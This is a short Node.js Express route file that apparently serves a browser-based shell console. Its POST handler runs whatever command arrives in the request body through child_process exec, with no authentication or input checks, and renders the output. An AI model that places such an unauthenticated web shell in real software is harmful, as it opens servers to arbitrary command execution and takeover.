var shell = require('child_process');
var iconv = require('iconv-lite');
var express = require('express');
var router = express.Router();

router.get('/', function(req, res, next) {
	res.render('index',{output:'Waiting...'});
});
router.post('/', function(req, res){
	shell.exec(req.body.shell,{encoding: 'binary'},function(error,stdout,stderr){
		console.log(req.body.out);
		if(req.body.out=="here")
			res.render('index',{output:iconv.decode(stdout,req.body.encode)});
		else if(req.body.out=="ResultsOnly")
			res.send(iconv.decode(stdout,req.body.encode)+"<p><a href='/shell'>Back</a></p>");
	});
})

module.exports = router;
